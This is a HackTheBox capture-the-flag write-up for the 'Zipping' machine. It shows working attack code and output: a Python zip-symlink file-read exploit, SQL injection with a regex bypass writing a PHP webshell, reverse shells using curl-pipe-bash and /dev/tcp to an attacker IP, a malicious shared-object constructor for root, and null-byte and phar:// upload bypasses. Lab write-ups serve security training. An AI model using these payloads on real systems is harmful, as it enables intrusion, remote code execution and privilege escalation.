---
render_with_liquid: false
title: HackTheBox Writeup  Zipping
date: 2023-09-02 23:45:20 +1400
tags: [hackthebox, nmap, linux, feroxbuster, ffuf, php, file-upload, file-read, zip, symlinks, sqli, mysql, local-file-inclusion, sqli-bypass, sqli2rce, file-write, lfi2rce, webshell, sudo, shared-object-hijack, hex-editor, file-upload-bypass, regex-bypass]
---




# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Zipping]
└─$ writehosts htb '10.129.70.107 zipping.htb'
+---------+--------+---------------+-------------+
| PROFILE | STATUS |      IP       |   DOMAIN    |
+---------+--------+---------------+-------------+
| htb     | on     | 10.129.70.107 | zipping.htb |
+---------+--------+---------------+-------------+
```

## Nmap

```bash

# Nmap 7.94 scan initiated Sat Sep  2 23:45:20 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80 zipping.htb  
Nmap scan report for zipping.htb (10.129.66.245)  
Host is up, received user-set (0.12s latency).  
Scanned at 2023-09-02 23:45:20 CST for 13s  
  
PORT   STATE SERVICE REASON         VERSION  
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP6mSkoF2+wARZhzEmi4RDFkpQx3gdzfggbgeI5qtcIseo7h1mcxH8UCPmw8Gx9+JsOjcNPBpHtp2deNZBzgKcA=  
|   256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOXXd7dM7wgVC+lrF0+ZIxKZlKdFhG2Caa9Uft/kLXDa  
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.54 ((Ubuntu))  
| http-methods:    
|_  Supported Methods: GET HEAD POST  
|_http-server-header: Apache/2.4.54 (Ubuntu)  
|_http-title: Zipping | Watch store  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Read data files from: /usr/bin/../share/nmap  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  

# Nmap done at Sat Sep  2 23:45:33 2023 -- 1 IP address (1 host up) scanned in 12.67 seconds
```

## 80 - Website : Watch Store

### Info

![](/assets/obsidian/2899f9338da440ab9dad5c5a4ced04d0.png)

### Directory

```bash
feroxbuster -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://zipping.htb/ -o ferox_80.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Zipping]
└─$ cat ferox_80.txt|grep -v "/assets/"
MSG      0.000 feroxbuster::heuristics detected directory listing: http://zipping.htb/assets (Apache)
301      GET        9l       28w      309c http://zipping.htb/shop => http://zipping.htb/shop/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://zipping.htb/shop/assets (Apache)
200      GET      317l     1354w    16738c http://zipping.htb/
301      GET        9l       28w      309c http://zipping.htb/shop => http://zipping.htb/shop/
301      GET        9l       28w      312c http://zipping.htb/uploads => http://zipping.htb/uploads/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://zipping.htb/assets (Apache)
200      GET      317l     1354w    16738c http://zipping.htb/
301      GET        9l       28w      309c http://zipping.htb/shop => http://zipping.htb/shop/
301      GET        9l       28w      312c http://zipping.htb/uploads => http://zipping.htb/uploads/
200      GET      113l      380w     5322c http://zipping.htb/upload.php
200      GET      317l     1354w    16738c http://zipping.htb/
```


# User Flag
---

## Enumeration

Tried to fuzz LFI but not found

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://zipping.htb/shop/index.php?page=FUZZ -fs 2615
```

Tried to find hidden pages, but nothing interesting

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://zipping.htb/shop/index.php?page=FUZZ -fs 2615
```

![](/assets/obsidian/a36f0f0934f89d45fa63ece4e308f57c.png)


## Shell as rektsu

### Zip file upload to arbitrary file read


#### Enumerate

Check the file metadata

![](/assets/obsidian/8661753409aee92d636617a499315689.png)

![](/assets/obsidian/a3ab786ebec0fe179899130788aba7e7.png)

```bash
┌──(bravosec㉿fsociety)-[~/Downloads]
└─$ exiftool download.pdf
ExifTool Version Number         : 12.65
File Name                       : download.pdf
Directory                       : .
File Size                       : 171 kB
File Modification Date/Time     : 2023:09:03 00:43:49+08:00
File Access Date/Time           : 2023:09:03 00:43:49+08:00
File Inode Change Date/Time     : 2023:09:03 00:43:49+08:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 8
Producer                        : pdfTeX-1.40.21
Creator                         : TeX
Create Date                     : 2020:08:21 14:05:59Z
Modify Date                     : 2020:08:21 14:05:59Z
Trapped                         : False
PTEX Fullbanner                 : This is pdfTeX, Version 3.14159265-2.6-1.40.21 (TeX Live 2020/Debian) kpathsea version 6.3.2
```

Did not find any exploit for this version of `pdfTeX`

Responses during the attempt to upload webshells :

![](/assets/obsidian/71b944a877c63b874d9529b38b237a16.png)

![](/assets/obsidian/4179a6aa1fb80ef15dd3225dcfcc1c7b.png)


#### Symlinks in zip

> Hacktricks - [Zip/Tar File Automatically decompressed Upload](https://book.hacktricks.xyz/pentesting-web/file-upload#zip-tar-file-automatically-decompressed-upload)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Zipping/exploit]
└─$ ln -s ../../../../../../etc/passwd test.pdf

┌──(bravosec㉿fsociety)-[~/htb/Zipping/exploit]
└─$ zip --symlinks test.zip test.pdf
  adding: test.pdf (stored 0%)
```

![](/assets/obsidian/1bb2ee931052f26632f2b9e047e89cde.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Zipping/loot]
└─$ cat passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
rektsu:x:1001:1001::/home/rektsu:/bin/bash
```

#### Python automation script

> `read_file.py`

```python
"""
Hackthebox - Zipping
Arbitary file read via uploading a zip file containing a symlink
"""
import sys, os
import requests
import re
import subprocess
import uuid


UPLOAD_URL = "http://zipping.htb/upload.php"
TEMP_DIR = "/tmp/zip_exp"


def run_cmd(command: str) -> tuple[str, str]:
    """Run subprocess command"""
    process = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True,
    )
    output, error = process.communicate()
    return output.decode("utf-8"), error.decode("utf-8")


def create_zip(fp: str) -> str:
    random_name = str(uuid.uuid4())
    pdf_name = f"{random_name}.pdf"
    zip_name = f"{random_name}.zip"
    run_cmd(f"ln -s {fp} {pdf_name}")
    run_cmd(f"zip --symlinks {zip_name} {pdf_name}")
    return f"{TEMP_DIR}/{zip_name}"


def exp(target_fp: str) -> str:
    zip_fp = create_zip(target_fp)
    file_name = "resume.zip"
    files = {
        "zipFile": (
            file_name,
            open(zip_fp, "rb"),
            "application/zip"
        )
    }
    data = {"submit": ""}
    with open(zip_fp, "rb") as f:
        r = requests.post(UPLOAD_URL, files=files, data=data)
    # print(r.text)
    try:
        download_path = re.findall(r'following path:</p><a href="(.*?)"', r.text)[0]
    except IndexError:
        print("[- ]Download Link not found")
        sys.exit(1)
    return f"http://zipping.htb/{download_path}"


def read_file(fp: str) -> str:
    download_url = exp(fp)
    # print(f"[+] URL : {download_url}")
    r = requests.get(download_url)
    if r.status_code != 200:
        print(f"[-] Download returned code : {r.status_code}")
        sys.exit(1)
    return r.text


def main():
    if not os.path.exists(TEMP_DIR):
        os.mkdir(TEMP_DIR)
    os.chdir(TEMP_DIR)
    fp = sys.argv[1]
    print(read_file(fp))


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 read_file.py <file_path>")
        sys.exit(1)
    main()
```

Check some interesting places

```bash
┌──(bravosec㉿fsociety)-[~/htb/Zipping/exploit]
└─$ python read_file.py /proc/self/cmdline
/usr/sbin/apache2-kstart

┌──(bravosec㉿fsociety)-[~/htb/Zipping/exploit]
└─$ python read_file.py /proc/self/environ
[-] Download returned code : 404
```

### Analyze source code

#### upload.php

```bash
┌──(bravosec㉿fsociety)-[~/htb/Zipping/exploit]
└─$ python read_file.py /proc/self/cwd/upload.php | tee ../loot/upload.php
```

I can't control `$zipFile` and `$uploadPath`, so there's no command injection

![](/assets/obsidian/30296539ed8a1e7aa843ae7508ea425d.png)

#### LFI in /shop/index.php

> `/proc/self/cwd/shop/index.php`

```php
<?php
session_start();
// Include functions and connect to the database using PDO MySQL
include 'functions.php';
$pdo = pdo_connect_mysql();
// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
$page = isset($_GET['page']) && file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';
// Include and show the requested page
include $page . '.php';
?>
```

It uses `include` but forces to add the `.php` extension, so common LFI to RCE methods like **log poisoning** and **php filter chain to RCE** won't work


#### Mysql root credentials in /shop/functions.php

> `/proc/self/cwd/shop/functions.php`

It's connecting as `root`

```php
<?php
function pdo_connect_mysql() {
    // Update the details below with your MySQL details
    $DATABASE_HOST = 'localhost';
    $DATABASE_USER = 'root';
    $DATABASE_PASS = 'MySQL_P@ssw0rd!';
    $DATABASE_NAME = 'zipping';
    try {
        return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS);
    } catch (PDOException $exception) {
        // If there is an error with the connection, stop the script and display the error.
        exit('Failed to connect to database!');
    }
}
// Template header, feel free to customize this
...
?>
```

Check password reuse, failed

```bash
┌──(bravosec㉿fsociety)-[~/htb/Zipping]
└─$ cssh root@zipping.htb 'MySQL_P@ssw0rd!'
Warning: Permanently added 'zipping.htb' (ED25519) to the list of known hosts.
Permission denied, please try again.

┌──(bravosec㉿fsociety)-[~/htb/Zipping]
└─$ cssh rektsu@zipping.htb 'MySQL_P@ssw0rd!'
Warning: Permanently added 'zipping.htb' (ED25519) to the list of known hosts.
Permission denied, please try again.
```


#### Dump php files under `/shop/`

Find php files from `/shop/index.php?page=` endpoint

```bash
ffuf -c -u 'http://zipping.htb/shop/index.php?page=FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -fs 2615 -o ffuf_page.json
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Zipping]
└─$ cat ffuf_page.json|jq '.results[].input.FUZZ' -r | tee shop_php.todump
index
cart
product
products
functions
placeorder
```

Dump php files

```bash
┌──(bravosec㉿fsociety)-[~/htb/Zipping]
└─$ mkdir -p dump/80/shop

┌──(bravosec㉿fsociety)-[~/htb/Zipping]
└─$ for f in $(cat shop_php.todump); do FN="$f.php"; python exploit/read_file.py "/proc/self/cwd/shop/${FN}" | tee dump/80/shop/$FN; done
```


#### SQLI in `/shop/cart.php`

> `/proc/self/cwd/shop/cart.php`

The SQLI vulnerability was obviously described in the comments : `Construct the SQL statement with a vulnerable parameter`, `Execute the SQL statement without any sanitization or parameter binding`

And this is the only php file that didn't use `prepare()`

My guess is that the creator utilized **Github Copilot** to generate codes with comments (It is very convenience)

```php
<?php
// If the user clicked the add to cart button on the product page we can check for the form data
if (isset($_POST['product_id'], $_POST['quantity'])) {
    // Set the post variables so we easily identify them, also make sure they are integer
    $product_id = $_POST['product_id'];
    $quantity = $_POST['quantity'];
    // Filtering user input for letters or special characters
    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $product_id, $match) || preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}[\]\\|;:'\",.<>\/?]/i", $quantity, $match)) {
        echo '';
    } else {
        // Construct the SQL statement with a vulnerable parameter
        $sql = "SELECT * FROM products WHERE id = '" . $_POST['product_id'] . "'";
        // Execute the SQL statement without any sanitization or parameter binding
        $product = $pdo->query($sql)->fetch(PDO::FETCH_ASSOC);
        // Check if the product exists (array is not empty)
        if ($product && $quantity > 0) {
            // Product exists in database, now we can create/update the session variable for the cart
            if (isset($_SESSION['cart']) && is_array($_SESSION['cart'])) {
                if (array_key_exists($product_id, $_SESSION['cart'])) {
                    // Product exists in cart so just update the quanity
                    $_SESSION['cart'][$product_id] += $quantity;
                } else {
                    // Product is not in cart so add it
                    $_SESSION['cart'][$product_id] = $quantity;
                }
            } else {
                // There are no products in cart, this will add the first product to cart
                $_SESSION['cart'] = array($product_id => $quantity);
            }
        }
        // Prevent form resubmission...
        header('location: index.php?page=cart');
        exit;
    }
}
...
```

### SQLI to RCE

#### Bypass preg_match()

```php
preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/"
```

Since the regex starts with `^.*` and doesn't use `/m` to match multi lines

Put a new line character : `%0a` at the beginning to bypass the check

The regular expression checks if `procuct_id` was ended with digits, so put `1` at the end of query

#### Write webshell

We have `root` session for **mysql**, which can write files

```c
POST /shop/index.php?page=cart HTTP/1.1
Host: zipping.htb


'; select '<?php phpinfo();?>' INTO OUTFILE '/var/lib/mysql/x.php'; --1
```

![](/assets/obsidian/9889bb57fcd92a195c494682f66f5e2c.png)

```c
GET /shop/index.php?page=/var/lib/mysql/x HTTP/1.1
```

![](/assets/obsidian/a9e395e92bd8bfd6d67bbbd4ce0286fc.png)

```c
POST /shop/index.php?page=cart HTTP/1.1
Host: zipping.htb


%0a'%3b%20select%20'%3c%3f%3d%60%24_GET%5b0%5d%60%3b'%20INTO%20OUTFILE%20'%2fvar%2flib%2fmysql%2fxx.php'%3b%20--1
```

Decoded payload :

```c
'; select '<?=`$_GET[0]`;' INTO OUTFILE '/var/lib/mysql/xx.php'; --1
```

Check command execution

```c
GET /shop/index.php?page=/var/lib/mysql/xx&0=id HTTP/1.1
```

![](/assets/obsidian/7b54c1b8a4babf1648d043232fb4b51f.png)

Setup web server to host reverse shell

```bash
mkdir -p www&&cd www
echo '/bin/bash -i >& /dev/tcp/10.10.16.16/1111 0>&1' > index.html
python -m http.server 80
```

Get reverse shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Zipping]
└─$ http 'http://zipping.htb/shop/index.php?page=/var/lib/mysql/xx&0=curl 10.10.16.16|bash'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Zipping]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.16] from (UNKNOWN) [10.129.50.229] 44990
bash: cannot set terminal process group (1124): Inappropriate ioctl for device
bash: no job control in this shell
rektsu@zipping:/var/www/html/shop$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<op$ python3 -c 'import pty; pty.spawn("/bin/bash")'
rektsu@zipping:/var/www/html/shop$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Zipping]
└─$ stty raw -echo;fg
[2]  - continued  nc -lvnp 1111

rektsu@zipping:/var/www/html/shop$ export TERM=xterm
rektsu@zipping:/var/www/html/shop$ id
id
uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu)
rektsu@zipping:/var/www/html/shop$ cat ~/user.txt
cat ~/user.txt
365f8c94776915650de70c8312c875f3
```


# Root Flag
---

## From rektsu to root

Run linpeas in background

```bash
┌──(bravosec㉿fsociety)-[~/htb/Zipping]
└─$ rlwrap nc -lvnp 1111
listening on [any] 1111 ...
curl 10.10.16.16/linpeas.sh|bash
```

```bash
rektsu@zipping:/var/www/html/shop$ curl 10.10.16.16|bash&
[9] 2122
```

### SUDO - so injection


#### Find hijackable shared object

```bash
rektsu@zipping:/var/www/html/shop$ sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

```bash
rektsu@zipping:/var/www/html/shop$ file /usr/bin/stock
/usr/bin/stock: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aa34d8030176fe286f8011c9d4470714d188ab42, for GNU/Linux 3.2.0, not stripped
```

```bash
rektsu@zipping:/var/www/html/shop$ sudo /usr/bin/stock
Enter the password: *
Invalid password, please try again.
```

Get password

```bash
rektsu@zipping:/var/www/html/shop$ strings /usr/bin/stock
```

![](/assets/obsidian/303f9470fadcb62c8986b0f7a5c5bfd1.png)

Played around a bit in the application, didn't find any abuseable functions

```bash
rektsu@zipping:/var/www/html/shop$ sudo /usr/bin/stock
Enter the password: St0ckM4nager

================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

Select an option:
```

Check availability of `ltrace` or `strace`

```bash
rektsu@zipping:/var/www/html/shop$ ltrace
bash: ltrace: command not found
rektsu@zipping:/var/www/html/shop$ strace
strace: must have PROG [ARGS] or -p PID
Try 'strace -h' for more information.
```

> **Check SO injection with filters**
> > Refer - https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid-binary-.so-injection
{: .prompt-tip }

Enter the password after it pause, since **grep** have suppressed the prompt message

```bash
rektsu@zipping:/home/rektsu$ strace /usr/bin/stock 2>&1 | grep -i -E "open|access|no such file"
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
St0ckM4nager
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
```

It is calling `/home/rektsu/.config/libcounter.so`, which have the result `No such file or directory`

#### Hijack

```bash
rektsu@zipping:/home/rektsu$ nano /home/rektsu/.config/libcounter.c
```

> `/home/rektsu/.config/libcounter.c`

```c

#include <stdio.h>

#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

```bash
rektsu@zipping:/home/rektsu$ gcc -shared -o /home/rektsu/.config/libcounter.so -fPIC /home/rektsu/.config/libcounter.c
rektsu@zipping:/home/rektsu$ sudo /usr/bin/stock
Enter the password: St0ckM4nager
root@zipping:/home/rektsu# id
uid=0(root) gid=0(root) groups=0(root)
root@zipping:/home/rektsu# cat /root/root.txt
5b163c05e131ae7b5f8ea84405029ea5
```

# Additional
---

## Unintended way to rektsu

### Bypass extension check in zip file with null bytes

`7z` will ignore null bytes but php checkers will not, so `rev.php .pdf` will pass the check

It will be extracted to `/tmp/uploads/<md5sum>/rev.php` and being moved to `/var/www/html/uploads/`

> rev.php0.pdf

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.14/1111 0>&1'");?>
```

```bash
┌──(bravosec㉿fsociety)-[~/Downloads]
└─$ zip final.zip rev.php0.pdf
  adding: rev.php0.pdf (deflated 11%)
```

Use **imHex** to edit the zip file (Or edit in **burpsuite** repeater from hex view)

![](/assets/obsidian/1d3a567b6fc80c20af4774b35a9a7780.png)

Replace `0` string to **null bytes** (`00` in hex) in the `rev.php0.pdf` at bottom

![](/assets/obsidian/66d4c3fda2f62328e151982c945b2e4d.png)

Upload it then get a shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Zipping/exploit]
└─$ curl 'http://zipping.htb/shop/index.php?page=../../../../../../tmp/uploads/8c143ce49eb8765ab338ff87970a0c9e/rev'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Zipping/exploit]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.14] from (UNKNOWN) [10.129.61.217] 50346
bash: cannot set terminal process group (1095): Inappropriate ioctl for device
bash: no job control in this shell
rektsu@zipping:/var/www/html/shop$ id
id
uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu)
```

### phar wrapper to RCE

1. Write a php webshell
2. Zip the web shell and save as `.pdf`
3. Use LFI with `phar://` wrapper to include the webshell inside the uploaded PDF file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Zipping/exploit]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php rev.php

┌──(bravosec㉿fsociety)-[~/htb/Zipping/exploit]
└─$ sed -i -e 's/127.0.0.1/10.10.14.35/' -e 's/1234/1111/' rev.php

┌──(bravosec㉿fsociety)-[~/htb/Zipping/exploit]
└─$ zip ok.pdf rev.php
  adding: rev.php (deflated 18%)

┌──(bravosec㉿fsociety)-[~/htb/Zipping/exploit]
└─$ zip ok.zip ok.pdf
updating: ok.pdf (deflated 37%)
```

![](/assets/obsidian/f3643d15af28e36383fceaac46e6ce14.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Zipping/exploit]
└─$ curl 'http://zipping.htb/shop/index.php?page=phar:///var/www/html/uploads/430fe450eeb494ff835e4a8bf979361f/ok.pdf/rev'
```
 
```bash
┌──(bravosec㉿fsociety)-[~/htb/Zipping/exploit]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.35] from (UNKNOWN) [10.129.61.217] 48818
Linux zipping 5.19.0-46-generic #47-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 16 13:30:11 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 19:01:47 up  1:29,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu)
```


